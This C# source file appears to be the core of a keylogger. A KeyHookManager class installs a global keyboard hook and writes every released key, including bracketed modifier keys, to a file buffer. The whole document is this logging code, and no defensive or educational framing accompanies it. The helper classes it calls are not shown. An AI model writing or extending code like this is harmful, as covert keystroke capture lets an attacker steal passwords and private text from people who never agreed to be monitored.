using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace KeyHook
{
    public class KeyHookManager
    {
        #region Memebers

        GlobalKeyboardHook gkh = new GlobalKeyboardHook();
        BufferManager bufferManager = new BufferManager();

        #endregion

        #region Constructors

        public KeyHookManager()
        {
        }

        #endregion

        #region Public Methods

        public void Start()
        {
            gkh.KeyDown += new KeyEventHandler(gkh_KeyDown);
            gkh.KeyUp += new KeyEventHandler(gkh_KeyUp);
            bufferManager.Start();
        }

        public void Stop()
        {
            gkh.KeyDown -= new KeyEventHandler(gkh_KeyDown);
            gkh.KeyUp -= new KeyEventHandler(gkh_KeyUp);
            bufferManager.Stop();
        }

        #endregion

        #region Global Key hook Events

        void gkh_KeyUp(object sender, KeyEventArgs e)
        {
            FileBuffer buffer = FileBuffer.GetInstance();
            if (GlobalKeyboardHook.IsModifier((int)e.KeyCode))
                buffer.Write("[" + e.KeyCode.ToString() + "]");
            else
                buffer.Write(e.KeyCode.ToString());
            //e.Handled = true;
        }

        void gkh_KeyDown(object sender, KeyEventArgs e)
        {
            //Do something
            //e.Handled = true;
        }

        #endregion

    }
}
